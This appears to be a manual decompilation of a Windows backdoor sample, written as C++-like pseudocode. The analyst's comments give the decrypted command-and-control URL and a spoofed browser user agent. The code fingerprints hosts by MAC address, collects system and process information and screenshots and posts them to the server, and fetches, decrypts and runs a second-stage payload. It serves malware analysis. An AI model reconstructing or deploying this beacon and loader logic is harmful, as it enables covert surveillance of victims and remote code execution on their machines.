


```cpp

char[] MAC_ADDR_00c73d38;


char offset_125f928[] = [
  58,30,64,30,64,30,60,30,2A,30,1D,30,1D,30,5D,30,
  5C,30,54,30,1E,30,5A,30,62,30,51,30,58,30,57,30,
  5E,30,4F,30,1E,30,51,30,5D,30,5B,30,1D,30,52,30,
  64,30,5D,30,52,30,8D,30,4F,30,61,30,57,30,4F,30,
  5E,30,4F,30,1D,30,63,30,54,30,53,30,5C,30,8D,30,
  51,30,5D,30,5E,30,56,30,57,30,62,30,5B,30,1E,30,
  60,30,58,30,60,30
]

char offset_0125f5e0 = [
  7B,30,5D,30,6A,30,57,30,5C,30,5C,30,4F,30,1D,30,
  24,30,1E,30,20,30,10,30,18,30,51,30,5D,30,5B,30,
  60,30,4F,30,64,30,57,30,52,30,5C,30,53,30,29,30,
  10,30,7B,30,81,30,77,30,73,30,10,30,25,30,1E,30,
  20,30,29,30,10,30,85,30,57,30,5E,30,54,30,5D,30,
  65,30,61,30,10,30,7E,30,84,30,10,30,26,30,1E,30,
  1F,30,29,30,10,30,84,30,62,30,57,30,54,30,53,30,
  5E,30,64,30,1D,30,26,30,1E,30,20,30,29,30,10,30,
  81,30,7C,30,71,30,71,30,22,30,29,30,10,30,1E,30,
  7E,30,73,30,84,30,10,30,71,30,7C,30,82,30,10,30,
  22,30,1E,30,20,30,1E,30,23,30,20,30,25,30,22,30,
  25,30,29,30,10,30,1E,30,7E,30,73,30,84,30,10,30,
  71,30,7C,30,82,30,10,30,21,30,1E,30,23,30,1E,30,
  21,30,20,30,25,30,22,30,27,30,29,30,10,30,1E,30,
  7E,30,73,30,84,30,10,30,71,30,7C,30,82,30,10,30,
  21,30,1E,30,20,30,1E,30,21,30,20,30,25,30,22,30,
  27,30,29,30,10,30,7B,30,53,30,54,30,57,30,4F,30,
  10,30,71,30,53,30,5E,30,64,30,53,30,62,30,10,30,
  80,30,71,30,10,30,26,30,1E,30,20,30,29,30,10,30,
  1E,30,7E,30,73,30,84,30,24,30,1E,30,20,30,71,30,
  29,30,10,30,84,30,4F,30,52,30,5C,30,53,30,64,30,
  10,30,80,30,71,30,10,30,22,30,1E,30,20,30,29,30,
  10,30,1E,30,7E,30,73,30,84,30,24,30,1E,30,20,30,
  73,30,29,30,10,30,77,30,5E,30,56,30,5D,30,80,30,
  4F,30,64,30,58,30,1E,30,21,30,17,30,00
]

void getMac() {
  func_01241a60(macaddr_01263d38, "UNNOWN-%d", func_01247437());
  h = LoadLibraryW("iphlpapi.dll");
  if (!h) {
    return;
  }
  offset_1263d90 = GetProcAddress(h, "GetAdapterAddresses");
  if (!offset_1263d90) {
    return;
  }

  ebp_8 = 0;
  for (int i = 0; i < 5; i++) {
    s = offset_1263d90(2, 0, 0, 0, &ebp_8);
    if (s != 0x6f)
      break;
    s = alloc(ebp_8);
    if (!s) {
      s = GetLastError();
      if (s) {
        func_012419f0("Call to GetAdapterAddresses failed.");
      }
    }
  }

  func_01241a60(macaddr_01263d38, "%02X%02X%02X%02X%02X%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void decrypt(data, len) {
  eax = 0;
  if (len == 0) return;
  if (len < 20) {
    return;
  }

  ecx = len & 0x8000001f;
  ecx--;
  ecx = ecx | 0xffffffe0;
  ecx++;

  edi = len - ecx;
  xmm1 = 7.0533445E-30;
  xmm2 = 5.459277E-19;

  for (eax = 0; eax < edi; eax += 20) {
    xmm0 = (float*)data[eax];
    xmm0 -= xmm1;
    xmm0 ^= xmm2;
    (float*)data[eax] = xmm0;

    xmm0 = (float*)data[eax + 10];
    xmm0 -= xmm1;
    xmm0 ^= xmm2;
    (float*)data[eax] = xmm0;
  }

  if (eax >= len)
    return;

  for (; eax < len; eax++) {
    tmp = data[eax]
    tmp -= 0x0f;
    tmp ^= 0x21;
    data[eax] = tmp;
  }
}

int SendPayload(int code, x, additional_data, additional_data_len, char* result, int* result_len) {
  SetData(full_url, 0, 0x1000);
  SetData(hostname, 0, 0x1000);
  SetData(ebp_ffffaf28, 0, 0x1000);
  SetData(ebp_2106, 0, 0x0ffe);

  strcpy(full_url, offset_125f928);
  strcpy(client_string, offset_0125f5e0);

  __fastcall decrypt(full_url, count(full_url)); // http://old.jrchina.com/btob_asiana/udel_confirm.php
  __fastcall decrypt(client_string, count(client_string)); // Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; .NET4.0E; InfoPath.3)

  s = strncmp(full_url, "https://", 8);
  if (!s) {
    port = 0x1bb;
    strcpy(hostname, ebp_10f8); // ebp_10f8 = &full_url - (8*2)
  }
  else {
    port = 0x50;
    strcpy(hostname, ebp_10fa); // ebp_10fa = &full_url - (7*2)
  }
  // hostname = "old.jrchina.com/btob_asiana/udel_confirm.php"

  s = strfind(hostname, "/"); // /btob_asiana/udel_confirm.php
  *s = 0;

  query_buffer_len = 80;
  internet_handle = InternetOpenW(client_string, 0, 0, 0, 0);
  // hostname = "old.jrchina.com" NULL "btob_asiana/udel_confirm.php"
  internet_connect_handle = InternetConnect(internet_handle, hostname, port, 0, 0, 3, 0, 0);
  request = HttpOpenRequestW(internet_connect_handle, "POST", ebp_ffffaf28, 0, 0, 0, 100, 0);

  send_data = alloc(additional_data_len + count(macaddr_01263d38));
  *send_data = code;
  strcpy(&send_data + 1, macaddr_01263d38, count(macaddr_01263d38));

  macaddr_len = count(macaddr_01263d38);
  if (additional_data) {
    strcpy(&send_data + 1 + macaddr_len, additional_data, additional_data_len);
    __thiscall encrypt(&send_data + 1 + macaddr_len, additional_data_len);
  }
  HtpSendRequestW(request, 0, 0, send_data, macaddr_len);

  HeapFree(send_data);

  // query status code
  HttpQueryInfoW(request, 0x13, query_buffer, &query_buffer_len, 0);

  if (query_buffer_len * 2 >= 100)
    func_01303e85();

  query_buffer[query_buffer_len * 2] = 0; // unicode => * 2, null terminate
  s = check_status_code(query_buffer);
  if (s != HTTP_STATUS_OK || result == 0 || result_len == 0)
    return;

  s = InternetReadFile(request, readfile_buffer, 0x0fd0, &readfile_buffer_len);
  if (s == 0) return;

  readfile_result = 0;
  readfile_result_len = 0;
  while (true) {
    if (readfile_buffer_len == 0)
      break;
    readfile_result = realloc(readfile_result, readfile_buffer_len);
    if (!readfile_result)
      return;
    __thiscall strcpy(readfile_result + readfile_result_len, readfile_buffer, readfile_buffer_len);
    readfile_result_len += readfile_buffer_len;
    s = InternetReadFile(request, readfile_buffer, 0x0fd0, &readfile_buffer_len);
    if (!s)
      break;
  }

  HttpEndRequestW(request, 0, 0, 0);

  result = readfile_result;
  *result_len = readfile_result_len;

  InternetCloseHandle(request);
  InternetCloseHandle(internet_connect_handle);
  InternetCloseHandle(internet_handle);
}

void GetSystemInformation_1(void* data) {
}

char[] offset_00c6f990 = ":";

void WriteAndExec(payload, size) {
  ebp_60c = payload;
  ebp_608 = size;

  SetData(ebp_604, 0, 0x1fe);
  SetData(ebp_404, 0, 0x1fe);
  SetData(ebp_204, 0, 0x1fe);

  if (!payload || !size) return;

  path_len = GetTempPathW(0xff, ebp_604);

  tmp = alloc()
  if (!tmp) return;

}

_ExecSecretPayload(payload_start, payload_end) {
  ebp_40c = 0;
  ebp_410 = payload_start;

  ppp = __fastcall func_00391240(payload_start, &ebp_40c); // connect internet, read internet file
  if (!ppp)
    return;

  if (ebp_40c < 0x64)
    return;

  if (ppp[0] != 0x46474e50)
    return;

  // the real payload has signature:
  // 0x46474e50 CHECK_BYTE encrypted_payload
  // ^~~~4B~~~^ ^~~~1B~~~^ ^~(ebp_40c-5)B~~^

  s = __fastcall what_is_this(ppp + 5, ebp_40c - 5);
  if (s != ppp[4])
    return;
  ebp_40c -= 5;
  __thiscall decrypt(ppp + 5);

  tmp = alloc(ebp_40c - 5);
  strcpy(tmp, ppp + 5, ebp_40c - 5);
  HeapFree(ebp_40c);

  if (!payload_start)
    return;

  __thiscall WriteAndExec(payload_start, ebp_40c);
  HeapFree(payload_start);
}

void ExecSecretPayload(payload) {
  SendPayload(33, ?, 0, 0, 0, 0, 0);
  s = strfind(payload, "\r");
  if (!s) {
    return;
  }

  *s = 0;     // replace \r with \0, the payload could be one line
  if (count(payload) < 1)
    return;
  strcpy(ebp_808, payload, count(payload));
  if (payload[0] != 0x31)
    return;
  __thiscall _ExecSecretPayload(ebp_808, ebp_808 + count(payload));
}

void help() {
  SetData(ebp_90, 0, 80);
  SetData(ebp_2390, 0, 2000);

  ebp_2b94 = 7;
  ebp_2b98 = 0;
  ebp_2ba8 = 0;
  ebp_2bc8 = 0;
  ebp_2bc4 = 0;
  ebp_4 = 0;

  func_0124b35d(0);
  func_01247458(0);

  while (true) {
    s = SendPayload(30, ?, 0, 0, ebp_2bc8, &ebp_2bc4);
    if (!s || !ebp_2bc4) {
      sleep(25);
      continue;
    }
    break;
  }

  CopyString(ebp_90, ebp_2bc8);
  HeapFree(ebp_2bc8);
  GetSystemInformation_1(ebp_2390);
  __thiscall func_00c52d00(ebp_2ba8, ebp_2390, count_char(ebp_2390));
  __thiscall func_00c52d00(ebp_2ba8, "", 2);
  __thiscall func_00c53760(ebp_2b90);

  __thiscall GetSystemInformation_2(epb_390, ebp_290, ebp_190);
  wsprintfW(ebp_2390, "%s/%s/%s/%s", ebp_2b90, ebp_390, ebp_290 ebp_190);
  __thiscall func_00c52d00(ebp_2ba8, ebp_2390, count_char(ebp_2390));
  __thiscall func_00c52d00(ebp_2ba8, offset_00c6f990, 1);
  char* tmp = __fastcall func_00c51010(ebp_90);

  __thiscall func_00c52d00(ebp_2ba8, tmp, count_char(tmp));
  __thiscall func_00c52d00(ebp_2ba8, "", 2);

  __thiscall ListProcess(ebp_2bc0);
  __thiscall func_00c52de0(ebp_2ba8, ebp_2bc0, 0, -1);

  while (ebp_2b94 < 8) {
    SendPayload(31, ebp_2ba8, ebp_2ba8, ebp_2b98 * 2, 0, 0);

    for (int i = 0; i < 3; i++) {
      ebp_2bcc = 0;
      s = TakePicture(ebp_2bcc);
      if (!s) {
        break;
      }
      s = SendPayload(34, ?, s, ebp_2bcc, 0, 0);
      if (s)
        sleep();
      func_010074ed();
    }

    s = SendPayload(32, ?, 0, 0, ebp_2bc8, &ebp_2bc4);    // get secret payload
    if (!s || !ebp_2bc4) {
      sleep();
      continue;
    }
    break;
  }

  __thiscall decrypt(ebp_2bc8);
  __thiscall ExecSecretPayload(ebp_2bc8); // exec this payload
  HeapFree(ebp_2bc8);
}
```
